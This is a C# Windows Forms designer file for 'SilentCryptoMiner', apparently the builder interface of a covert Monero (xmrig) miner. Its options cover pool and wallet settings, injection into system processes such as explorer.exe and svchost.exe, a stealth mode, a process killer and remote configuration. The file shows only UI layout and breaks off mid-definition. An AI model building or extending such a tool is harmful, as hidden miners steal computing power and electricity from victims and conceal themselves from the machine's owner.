using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace SilentCryptoMiner
{
    [DesignerGenerated()]
    public partial class MinerXMR : Form
    {

        // Form overrides dispose to clean up the component list.
        [DebuggerNonUserCode()]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && components is object)
                {
                    components.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        // Required by the Windows Form Designer
        private System.ComponentModel.IContainer components;

        // NOTE: The following procedure is required by the Windows Form Designer
        // It can be modified using the Windows Form Designer.  
        // Do not modify it using the code editor.
        [DebuggerStepThrough()]
        private void InitializeComponent()
        {
            this.BackgroundWorker2 = new System.ComponentModel.BackgroundWorker();
            this.formMinerXMR = new MephTheme();
            this.MephTabcontrol2 = new MephTabcontrol();
            this.TabPage1 = new System.Windows.Forms.TabPage();
            this.labelWiki = new System.Windows.Forms.LinkLabel();
            this.Label10 = new System.Windows.Forms.Label();
            this.Label5 = new System.Windows.Forms.Label();
            this.comboInjection = new MephComboBox();
            this.Label8 = new System.Windows.Forms.Label();
            this.txtPoolUsername = new MephTextBox();
            this.txtPoolURL = new MephTextBox();
            this.Label6 = new System.Windows.Forms.Label();
            this.Label7 = new System.Windows.Forms.Label();
            this.txtPoolPassowrd = new MephTextBox();
            this.TabPage6 = new System.Windows.Forms.TabPage();
            this.label33 = new System.Windows.Forms.Label();
            this.comboAlgorithm = new MephComboBox();
            this.Label27 = new System.Windows.Forms.Label();
            this.toggleStealth = new MephToggleSwitch();
            this.Label24 = new System.Windows.Forms.Label();
            this.Label23 = new System.Windows.Forms.Label();
            this.txtIdleWait = new MephTextBox();
            this.txtIdleCPU = new MephComboBox();
            this.txtMaxCPU = new MephComboBox();
            this.Label22 = new System.Windows.Forms.Label();
            this.Label18 = new System.Windows.Forms.Label();
            this.toggleSSL = new MephToggleSwitch();
            this.Label13 = new System.Windows.Forms.Label();
            this.toggleCPU = new MephToggleSwitch();
            this.Label12 = new System.Windows.Forms.Label();
            this.toggleNicehash = new MephToggleSwitch();
            this.Label11 = new System.Windows.Forms.Label();
            this.toggleIdle = new MephToggleSwitch();
            this.Label4 = new System.Windows.Forms.Label();
            this.toggleGPU = new MephToggleSwitch();
            this.Label3 = new System.Windows.Forms.Label();
            this.TabPage3 = new System.Windows.Forms.TabPage();
            this.chkAPI = new MephCheckBox();
            this.txtAPI = new MephTextBox();
            this.label32 = new System.Windows.Forms.Label();
            this.toggleProcessKiller = new MephToggleSwitch();
            this.label19 = new System.Windows.Forms.Label();
            this.txtKillTargets = new MephTextBox();
            this.label1 = new System.Windows.Forms.Label();
            this.txtStealthTargets = new MephTextBox();
            this.chkAdvParam = new MephCheckBox();
            this.txtAdvParam = new MephTextBox();
            this.chkRemoteConfig = new MephCheckBox();
            this.txtRemoteConfig = new MephTextBox();
            this.formMinerXMR.SuspendLayout();
            this.MephTabcontrol2.SuspendLayout();
            this.TabPage1.SuspendLayout();
            this.TabPage6.SuspendLayout();
            this.TabPage3.SuspendLayout();
            this.SuspendLayout();
            // 
            // formMinerXMR
            // 
            this.formMinerXMR.AccentColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.formMinerXMR.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.formMinerXMR.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(28)))), ((int)(((byte)(28)))), ((int)(((byte)(28)))));
            this.formMinerXMR.Controls.Add(this.MephTabcontrol2);
            this.formMinerXMR.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.formMinerXMR.ForeColor = System.Drawing.Color.Gray;
            this.formMinerXMR.Location = new System.Drawing.Point(0, 0);
            this.formMinerXMR.Margin = new System.Windows.Forms.Padding(2);
            this.formMinerXMR.MaximumSize = new System.Drawing.Size(535, 272);
            this.formMinerXMR.MinimumSize = new System.Drawing.Size(535, 272);
            this.formMinerXMR.Name = "formMinerXMR";
            this.formMinerXMR.Size = new System.Drawing.Size(535, 272);
            this.formMinerXMR.SubHeader = "Create a new miner (xmrig)";
            this.formMinerXMR.TabIndex = 0;
            this.formMinerXMR.Text = "Create New Miner";
            // 
            // MephTabcontrol2
            // 
            this.MephTabcontrol2.Alignment = System.Windows.Forms.TabAlignment.Left;
            this.MephTabcontrol2.Anchor = System.Windows.Forms.AnchorStyles.None;
            this.MephTabcontrol2.Controls.Add(this.TabPage1);
            this.MephTabcontrol2.Controls.Add(this.TabPage6);
            this.MephTabcontrol2.Controls.Add(this.TabPage3);
            this.MephTabcontrol2.Font = new System.Drawing.Font("Segoe UI", 9.5F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(128)));
            this.MephTabcontrol2.ItemSize = new System.Drawing.Size(32, 85);
            this.MephTabcontrol2.Location = new System.Drawing.Point(12, 65);
            this.MephTabcontrol2.Multiline = true;
            this.MephTabcontrol2.Name = "MephTabcontrol2";
            this.MephTabcontrol2.SelectedIndex = 0;
            this.MephTabcontrol2.Size = new System.Drawing.Size(511, 197);
            this.MephTabcontrol2.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.MephTabcontrol2.TabIndex = 17;
            // 
            // TabPage1
            // 
            this.TabPage1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.TabPage1.Controls.Add(this.labelWiki);
            this.TabPage1.Controls.Add(this.Label10);
            this.TabPage1.Controls.Add(this.Label5);
            this.TabPage1.Controls.Add(this.comboInjection);
            this.TabPage1.Controls.Add(this.Label8);
            this.TabPage1.Controls.Add(this.txtPoolUsername);
            this.TabPage1.Controls.Add(this.txtPoolURL);
            this.TabPage1.Controls.Add(this.Label6);
            this.TabPage1.Controls.Add(this.Label7);
            this.TabPage1.Controls.Add(this.txtPoolPassowrd);
            this.TabPage1.Location = new System.Drawing.Point(89, 4);
            this.TabPage1.Name = "TabPage1";
            this.TabPage1.Size = new System.Drawing.Size(418, 189);
            this.TabPage1.TabIndex = 0;
            this.TabPage1.Text = "Connection";
            // 
            // labelWiki
            // 
            this.labelWiki.AutoSize = true;
            this.labelWiki.BackColor = System.Drawing.Color.Transparent;
            this.labelWiki.LinkColor = System.Drawing.Color.FromArgb(((int)(((byte)(255)))), ((int)(((byte)(128)))), ((int)(((byte)(0)))));
            this.labelWiki.Location = new System.Drawing.Point(378, 8);
            this.labelWiki.Name = "labelWiki";
            this.labelWiki.Size = new System.Drawing.Size(29, 17);
            this.labelWiki.TabIndex = 40;
            this.labelWiki.TabStop = true;
            this.labelWiki.Text = "wiki";
            // 
            // Label10
            // 
            this.Label10.AutoSize = true;
            this.Label10.BackColor = System.Drawing.Color.Transparent;
            this.Label10.Location = new System.Drawing.Point(226, 8);
            this.Label10.Name = "Label10";
            this.Label10.Size = new System.Drawing.Size(160, 17);
            this.Label10.TabIndex = 41;
            this.Label10.Text = "For help please check the ";
            // 
            // Label5
            // 
            this.Label5.AutoSize = true;
            this.Label5.Location = new System.Drawing.Point(8, 158);
            this.Label5.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label5.Name = "Label5";
            this.Label5.Size = new System.Drawing.Size(67, 17);
            this.Label5.TabIndex = 19;
            this.Label5.Text = "Inject Into:";
            // 
            // comboInjection
            // 
            this.comboInjection.BackColor = System.Drawing.Color.Transparent;
            this.comboInjection.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboInjection.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboInjection.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboInjection.ForeColor = System.Drawing.Color.Silver;
            this.comboInjection.FormattingEnabled = true;
            this.comboInjection.ItemHeight = 16;
            this.comboInjection.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboInjection.Items.AddRange(new object[] {
            "explorer.exe",
            "nslookup.exe",
            "cmd.exe",
            "notepad.exe",
            "svchost.exe",
            "conhost.exe"});
            this.comboInjection.Location = new System.Drawing.Point(79, 156);
            this.comboInjection.Margin = new System.Windows.Forms.Padding(2);
            this.comboInjection.Name = "comboInjection";
            this.comboInjection.Size = new System.Drawing.Size(327, 22);
            this.comboInjection.StartIndex = 0;
            this.comboInjection.TabIndex = 18;
            // 
            // Label8
            // 
            this.Label8.AutoSize = true;
            this.Label8.Location = new System.Drawing.Point(8, 8);
            this.Label8.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label8.Name = "Label8";
            this.Label8.Size = new System.Drawing.Size(37, 17);
            this.Label8.TabIndex = 15;
            this.Label8.Text = "Pool:";
            // 
            // txtPoolUsername
            // 
            this.txtPoolUsername.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolUsername.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolUsername.Location = new System.Drawing.Point(11, 77);
            this.txtPoolUsername.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolUsername.MaxLength = 32767;
            this.txtPoolUsername.MultiLine = false;
            this.txtPoolUsername.Name = "txtPoolUsername";
            this.txtPoolUsername.Size = new System.Drawing.Size(395, 24);
            this.txtPoolUsername.TabIndex = 10;
            this.txtPoolUsername.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolUsername.UseSystemPasswordChar = false;
            this.txtPoolUsername.WordWrap = false;
            // 
            // txtPoolURL
            // 
            this.txtPoolURL.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolURL.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolURL.Location = new System.Drawing.Point(12, 29);
            this.txtPoolURL.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolURL.MaxLength = 32767;
            this.txtPoolURL.MultiLine = false;
            this.txtPoolURL.Name = "txtPoolURL";
            this.txtPoolURL.Size = new System.Drawing.Size(394, 24);
            this.txtPoolURL.TabIndex = 14;
            this.txtPoolURL.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolURL.UseSystemPasswordChar = false;
            this.txtPoolURL.WordWrap = false;
            // 
            // Label6
            // 
            this.Label6.AutoSize = true;
            this.Label6.Location = new System.Drawing.Point(9, 55);
            this.Label6.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label6.Name = "Label6";
            this.Label6.Size = new System.Drawing.Size(130, 17);
            this.Label6.TabIndex = 11;
            this.Label6.Text = "Wallet Address/User:";
            // 
            // Label7
            // 
            this.Label7.AutoSize = true;
            this.Label7.Location = new System.Drawing.Point(9, 102);
            this.Label7.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label7.Name = "Label7";
            this.Label7.Size = new System.Drawing.Size(140, 17);
            this.Label7.TabIndex = 13;
            this.Label7.Text = "Password (if required):";
            // 
            // txtPoolPassowrd
            // 
            this.txtPoolPassowrd.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtPoolPassowrd.ForeColor = System.Drawing.Color.Silver;
            this.txtPoolPassowrd.Location = new System.Drawing.Point(12, 122);
            this.txtPoolPassowrd.Margin = new System.Windows.Forms.Padding(2);
            this.txtPoolPassowrd.MaxLength = 32767;
            this.txtPoolPassowrd.MultiLine = false;
            this.txtPoolPassowrd.Name = "txtPoolPassowrd";
            this.txtPoolPassowrd.Size = new System.Drawing.Size(394, 24);
            this.txtPoolPassowrd.TabIndex = 12;
            this.txtPoolPassowrd.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtPoolPassowrd.UseSystemPasswordChar = false;
            this.txtPoolPassowrd.WordWrap = false;
            // 
            // TabPage6
            // 
            this.TabPage6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.TabPage6.Controls.Add(this.label33);
            this.TabPage6.Controls.Add(this.comboAlgorithm);
            this.TabPage6.Controls.Add(this.Label27);
            this.TabPage6.Controls.Add(this.toggleStealth);
            this.TabPage6.Controls.Add(this.Label24);
            this.TabPage6.Controls.Add(this.Label23);
            this.TabPage6.Controls.Add(this.txtIdleWait);
            this.TabPage6.Controls.Add(this.txtIdleCPU);
            this.TabPage6.Controls.Add(this.txtMaxCPU);
            this.TabPage6.Controls.Add(this.Label22);
            this.TabPage6.Controls.Add(this.Label18);
            this.TabPage6.Controls.Add(this.toggleSSL);
            this.TabPage6.Controls.Add(this.Label13);
            this.TabPage6.Controls.Add(this.toggleCPU);
            this.TabPage6.Controls.Add(this.Label12);
            this.TabPage6.Controls.Add(this.toggleNicehash);
            this.TabPage6.Controls.Add(this.Label11);
            this.TabPage6.Controls.Add(this.toggleIdle);
            this.TabPage6.Controls.Add(this.Label4);
            this.TabPage6.Controls.Add(this.toggleGPU);
            this.TabPage6.Controls.Add(this.Label3);
            this.TabPage6.Location = new System.Drawing.Point(89, 4);
            this.TabPage6.Name = "TabPage6";
            this.TabPage6.Padding = new System.Windows.Forms.Padding(3);
            this.TabPage6.Size = new System.Drawing.Size(418, 189);
            this.TabPage6.TabIndex = 5;
            this.TabPage6.Text = "Mining";
            // 
            // label33
            // 
            this.label33.AutoSize = true;
            this.label33.Location = new System.Drawing.Point(255, 141);
            this.label33.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label33.Name = "label33";
            this.label33.Size = new System.Drawing.Size(68, 17);
            this.label33.TabIndex = 70;
            this.label33.Text = "Algorithm:";
            // 
            // comboAlgorithm
            // 
            this.comboAlgorithm.BackColor = System.Drawing.Color.Transparent;
            this.comboAlgorithm.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.comboAlgorithm.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboAlgorithm.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.comboAlgorithm.ForeColor = System.Drawing.Color.Silver;
            this.comboAlgorithm.FormattingEnabled = true;
            this.comboAlgorithm.ItemHeight = 16;
            this.comboAlgorithm.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.comboAlgorithm.Items.AddRange(new object[] {
            "rx/0",
            "cn/upx2",
            "argon2/chukwav2",
            "cn/ccx",
            "kawpow",
            "rx/keva",
            "astrobwt",
            "cn-pico/tlo",
            "rx/sfx",
            "rx/arq",
            "rx/graft",
            "argon2/chukwa",
            "argon2/ninja",
            "rx/wow",
            "cn/fast",
            "cn/rwz",
            "cn/zls",
            "cn/double",
            "cn/r",
            "cn-pico",
            "cn/half",
            "cn/2",
            "cn/xao",
            "cn/rto",
            "cn-heavy/tube",
            "cn-heavy/xhv",
            "cn-heavy/0",
            "cn/1",
            "cn-lite/1",
            "cn-lite/0",
            "cn/0"});
            this.comboAlgorithm.Location = new System.Drawing.Point(256, 160);
            this.comboAlgorithm.Margin = new System.Windows.Forms.Padding(2);
            this.comboAlgorithm.Name = "comboAlgorithm";
            this.comboAlgorithm.Size = new System.Drawing.Size(151, 22);
            this.comboAlgorithm.StartIndex = 0;
            this.comboAlgorithm.TabIndex = 69;
            this.comboAlgorithm.SelectedIndexChanged += new System.EventHandler(this.comboAlgorithm_SelectedIndexChanged);
            // 
            // Label27
            // 
            this.Label27.AutoSize = true;
            this.Label27.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label27.Location = new System.Drawing.Point(11, 120);
            this.Label27.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label27.Name = "Label27";
            this.Label27.Size = new System.Drawing.Size(50, 17);
            this.Label27.TabIndex = 56;
            this.Label27.Text = "Stealth:";
            // 
            // toggleStealth
            // 
            this.toggleStealth.BackColor = System.Drawing.Color.Transparent;
            this.toggleStealth.Checked = false;
            this.toggleStealth.ForeColor = System.Drawing.Color.Black;
            this.toggleStealth.Location = new System.Drawing.Point(131, 118);
            this.toggleStealth.Margin = new System.Windows.Forms.Padding(2);
            this.toggleStealth.Name = "toggleStealth";
            this.toggleStealth.Size = new System.Drawing.Size(50, 24);
            this.toggleStealth.TabIndex = 55;
            this.toggleStealth.Text = "Enable Nicehash Mining";
            // 
            // Label24
            // 
            this.Label24.AutoSize = true;
            this.Label24.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label24.Location = new System.Drawing.Point(357, 97);
            this.Label24.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label24.Name = "Label24";
            this.Label24.Size = new System.Drawing.Size(54, 17);
            this.Label24.TabIndex = 53;
            this.Label24.Text = "Minutes";
            // 
            // Label23
            // 
            this.Label23.AutoSize = true;
            this.Label23.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label23.Location = new System.Drawing.Point(253, 98);
            this.Label23.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label23.Name = "Label23";
            this.Label23.Size = new System.Drawing.Size(61, 17);
            this.Label23.TabIndex = 52;
            this.Label23.Text = "Idle Wait:";
            // 
            // txtIdleWait
            // 
            this.txtIdleWait.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtIdleWait.Enabled = false;
            this.txtIdleWait.Font = new System.Drawing.Font("Segoe UI", 8.25F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.txtIdleWait.ForeColor = System.Drawing.Color.Silver;
            this.txtIdleWait.Location = new System.Drawing.Point(331, 95);
            this.txtIdleWait.MaxLength = 32767;
            this.txtIdleWait.MultiLine = false;
            this.txtIdleWait.Name = "txtIdleWait";
            this.txtIdleWait.Size = new System.Drawing.Size(24, 24);
            this.txtIdleWait.TabIndex = 51;
            this.txtIdleWait.Text = "5";
            this.txtIdleWait.TextAlignment = System.Windows.Forms.HorizontalAlignment.Right;
            this.txtIdleWait.UseSystemPasswordChar = false;
            this.txtIdleWait.WordWrap = false;
            // 
            // txtIdleCPU
            // 
            this.txtIdleCPU.BackColor = System.Drawing.Color.Transparent;
            this.txtIdleCPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.txtIdleCPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.txtIdleCPU.Enabled = false;
            this.txtIdleCPU.Font = new System.Drawing.Font("Verdana", 8F);
            this.txtIdleCPU.ForeColor = System.Drawing.Color.Silver;
            this.txtIdleCPU.FormattingEnabled = true;
            this.txtIdleCPU.ItemHeight = 16;
            this.txtIdleCPU.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.txtIdleCPU.Items.AddRange(new object[] {
            "0%",
            "10%",
            "20%",
            "30%",
            "40%",
            "50%",
            "60%",
            "70%",
            "80%",
            "90%",
            "100%"});
            this.txtIdleCPU.Location = new System.Drawing.Point(347, 67);
            this.txtIdleCPU.Name = "txtIdleCPU";
            this.txtIdleCPU.Size = new System.Drawing.Size(60, 22);
            this.txtIdleCPU.StartIndex = 8;
            this.txtIdleCPU.TabIndex = 49;
            // 
            // txtMaxCPU
            // 
            this.txtMaxCPU.BackColor = System.Drawing.Color.Transparent;
            this.txtMaxCPU.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
            this.txtMaxCPU.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.txtMaxCPU.Font = new System.Drawing.Font("Verdana", 8F);
            this.txtMaxCPU.ForeColor = System.Drawing.Color.Silver;
            this.txtMaxCPU.FormattingEnabled = true;
            this.txtMaxCPU.ItemHeight = 16;
            this.txtMaxCPU.ItemHighlightColor = System.Drawing.Color.FromArgb(((int)(((byte)(55)))), ((int)(((byte)(55)))), ((int)(((byte)(55)))));
            this.txtMaxCPU.Items.AddRange(new object[] {
            "0%",
            "10%",
            "20%",
            "30%",
            "40%",
            "50%",
            "60%",
            "70%",
            "80%",
            "90%",
            "100%"});
            this.txtMaxCPU.Location = new System.Drawing.Point(347, 39);
            this.txtMaxCPU.Name = "txtMaxCPU";
            this.txtMaxCPU.Size = new System.Drawing.Size(60, 22);
            this.txtMaxCPU.StartIndex = 2;
            this.txtMaxCPU.TabIndex = 26;
            // 
            // Label22
            // 
            this.Label22.AutoSize = true;
            this.Label22.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label22.Location = new System.Drawing.Point(253, 70);
            this.Label22.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label22.Name = "Label22";
            this.Label22.Size = new System.Drawing.Size(60, 17);
            this.Label22.TabIndex = 48;
            this.Label22.Text = "Idle CPU:";
            // 
            // Label18
            // 
            this.Label18.AutoSize = true;
            this.Label18.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label18.Location = new System.Drawing.Point(11, 66);
            this.Label18.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label18.Name = "Label18";
            this.Label18.Size = new System.Drawing.Size(56, 17);
            this.Label18.TabIndex = 42;
            this.Label18.Text = "SSL/TLS:";
            // 
            // toggleSSL
            // 
            this.toggleSSL.BackColor = System.Drawing.Color.Transparent;
            this.toggleSSL.Checked = false;
            this.toggleSSL.ForeColor = System.Drawing.Color.Black;
            this.toggleSSL.Location = new System.Drawing.Point(130, 64);
            this.toggleSSL.Margin = new System.Windows.Forms.Padding(2);
            this.toggleSSL.Name = "toggleSSL";
            this.toggleSSL.Size = new System.Drawing.Size(50, 24);
            this.toggleSSL.TabIndex = 41;
            this.toggleSSL.Text = "Enable SSL/TLS Connection";
            // 
            // Label13
            // 
            this.Label13.AutoSize = true;
            this.Label13.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label13.Location = new System.Drawing.Point(11, 11);
            this.Label13.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label13.Name = "Label13";
            this.Label13.Size = new System.Drawing.Size(79, 17);
            this.Label13.TabIndex = 34;
            this.Label13.Text = "CPU Mining:";
            // 
            // toggleCPU
            // 
            this.toggleCPU.BackColor = System.Drawing.Color.Transparent;
            this.toggleCPU.Checked = true;
            this.toggleCPU.ForeColor = System.Drawing.Color.Black;
            this.toggleCPU.Location = new System.Drawing.Point(130, 9);
            this.toggleCPU.Margin = new System.Windows.Forms.Padding(2);
            this.toggleCPU.Name = "toggleCPU";
            this.toggleCPU.Size = new System.Drawing.Size(50, 24);
            this.toggleCPU.TabIndex = 33;
            this.toggleCPU.Text = "Enable CPU Mining";
            // 
            // Label12
            // 
            this.Label12.AutoSize = true;
            this.Label12.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label12.Location = new System.Drawing.Point(11, 93);
            this.Label12.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label12.Name = "Label12";
            this.Label12.Size = new System.Drawing.Size(108, 17);
            this.Label12.TabIndex = 32;
            this.Label12.Text = "Nicehash Mining:";
            // 
            // toggleNicehash
            // 
            this.toggleNicehash.BackColor = System.Drawing.Color.Transparent;
            this.toggleNicehash.Checked = false;
            this.toggleNicehash.ForeColor = System.Drawing.Color.Black;
            this.toggleNicehash.Location = new System.Drawing.Point(131, 91);
            this.toggleNicehash.Margin = new System.Windows.Forms.Padding(2);
            this.toggleNicehash.Name = "toggleNicehash";
            this.toggleNicehash.Size = new System.Drawing.Size(50, 24);
            this.toggleNicehash.TabIndex = 31;
            this.toggleNicehash.Text = "Enable Nicehash Mining";
            // 
            // Label11
            // 
            this.Label11.AutoSize = true;
            this.Label11.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label11.Location = new System.Drawing.Point(253, 12);
            this.Label11.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label11.Name = "Label11";
            this.Label11.Size = new System.Drawing.Size(76, 17);
            this.Label11.TabIndex = 30;
            this.Label11.Text = "Idle Mining:";
            // 
            // toggleIdle
            // 
            this.toggleIdle.BackColor = System.Drawing.Color.Transparent;
            this.toggleIdle.Checked = false;
            this.toggleIdle.ForeColor = System.Drawing.Color.Black;
            this.toggleIdle.Location = new System.Drawing.Point(357, 9);
            this.toggleIdle.Margin = new System.Windows.Forms.Padding(2);
            this.toggleIdle.Name = "toggleIdle";
            this.toggleIdle.Size = new System.Drawing.Size(50, 24);
            this.toggleIdle.TabIndex = 29;
            this.toggleIdle.Text = "Enable Idle Mining";
            this.toggleIdle.CheckedChanged += new MephToggleSwitch.CheckedChangedEventHandler(this.toggleIdle_CheckedChanged);
            // 
            // Label4
            // 
            this.Label4.AutoSize = true;
            this.Label4.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label4.Location = new System.Drawing.Point(10, 39);
            this.Label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label4.Name = "Label4";
            this.Label4.Size = new System.Drawing.Size(80, 17);
            this.Label4.TabIndex = 28;
            this.Label4.Text = "GPU Mining:";
            // 
            // toggleGPU
            // 
            this.toggleGPU.BackColor = System.Drawing.Color.Transparent;
            this.toggleGPU.Checked = false;
            this.toggleGPU.ForeColor = System.Drawing.Color.Black;
            this.toggleGPU.Location = new System.Drawing.Point(130, 36);
            this.toggleGPU.Margin = new System.Windows.Forms.Padding(2);
            this.toggleGPU.Name = "toggleGPU";
            this.toggleGPU.Size = new System.Drawing.Size(50, 24);
            this.toggleGPU.TabIndex = 27;
            this.toggleGPU.Text = "Enable GPU Mining";
            // 
            // Label3
            // 
            this.Label3.AutoSize = true;
            this.Label3.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.Label3.Location = new System.Drawing.Point(253, 42);
            this.Label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.Label3.Name = "Label3";
            this.Label3.Size = new System.Drawing.Size(64, 17);
            this.Label3.TabIndex = 25;
            this.Label3.Text = "Max CPU:";
            // 
            // TabPage3
            // 
            this.TabPage3.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.TabPage3.Controls.Add(this.chkAPI);
            this.TabPage3.Controls.Add(this.txtAPI);
            this.TabPage3.Controls.Add(this.label32);
            this.TabPage3.Controls.Add(this.toggleProcessKiller);
            this.TabPage3.Controls.Add(this.label19);
            this.TabPage3.Controls.Add(this.txtKillTargets);
            this.TabPage3.Controls.Add(this.label1);
            this.TabPage3.Controls.Add(this.txtStealthTargets);
            this.TabPage3.Controls.Add(this.chkAdvParam);
            this.TabPage3.Controls.Add(this.txtAdvParam);
            this.TabPage3.Controls.Add(this.chkRemoteConfig);
            this.TabPage3.Controls.Add(this.txtRemoteConfig);
            this.TabPage3.Location = new System.Drawing.Point(89, 4);
            this.TabPage3.Name = "TabPage3";
            this.TabPage3.Size = new System.Drawing.Size(418, 189);
            this.TabPage3.TabIndex = 7;
            this.TabPage3.Text = "Advanced";
            // 
            // chkAPI
            // 
            this.chkAPI.AccentColor = System.Drawing.Color.ForestGreen;
            this.chkAPI.BackColor = System.Drawing.Color.Transparent;
            this.chkAPI.Checked = false;
            this.chkAPI.Cursor = System.Windows.Forms.Cursors.Hand;
            this.chkAPI.ForeColor = System.Drawing.Color.Black;
            this.chkAPI.Location = new System.Drawing.Point(228, 125);
            this.chkAPI.Margin = new System.Windows.Forms.Padding(2);
            this.chkAPI.Name = "chkAPI";
            this.chkAPI.Size = new System.Drawing.Size(178, 24);
            this.chkAPI.TabIndex = 129;
            this.chkAPI.Text = "API Endpoint URL";
            this.chkAPI.CheckedChanged += new MephCheckBox.CheckedChangedEventHandler(this.chkAPI_CheckedChanged);
            // 
            // txtAPI
            // 
            this.txtAPI.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(50)))), ((int)(((byte)(50)))));
            this.txtAPI.Enabled = false;
            this.txtAPI.ForeColor = System.Drawing.Color.Silver;
            this.txtAPI.Location = new System.Drawing.Point(228, 153);
            this.txtAPI.Margin = new System.Windows.Forms.Padding(2);
            this.txtAPI.MaxLength = 32767;
            this.txtAPI.MultiLine = false;
            this.txtAPI.Name = "txtAPI";
            this.txtAPI.Size = new System.Drawing.Size(178, 24);
            this.txtAPI.TabIndex = 128;
            this.txtAPI.TextAlignment = System.Windows.Forms.HorizontalAlignment.Left;
            this.txtAPI.UseSystemPasswordChar = false;
            this.txtAPI.WordWrap = false;
            // 
            // label32
            // 
            this.label32.AutoSize = true;
            this.label32.Font = new System.Drawing.Font("Segoe UI", 9.5F);
            this.label32.Location = new System.Drawing.Point(13, 14);
            this.label32.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label32.Name = "label32";
            this.label32.Size = new System.Drawing.Size(89, 17);
            this.label32.TabIndex = 127;
            this.label32.Text = "Process Killer:";
            // 
            // toggleProcessKiller
            // 
            this.toggleProcessKiller.BackColor = System.Drawing.Color.Transparent;
            this.toggleProcessKiller.Checked = false;
            this.toggleProcessKiller.ForeColor = System.Drawing.Color.Black;
            this.toggleProcessKiller.Location = new System.Drawing.Point(106, 12);
            this.toggleProcessKiller.Margin = new System.Windows.Forms.Padding(2);
            this.toggleProcessKiller.Name = "toggleProcessKiller";
            this.toggleProcessKiller.Size = new System.Drawing.Size(50, 24);
            this.toggleProcessKiller.TabIndex = 126;
            // 
            // label19
            // 
            this.label19.AutoSize = true;
            this.label19.BackColor = System.Drawing.Color.Transparent;
            this.label19.ForeColor = System.Drawing.Color.Gray;
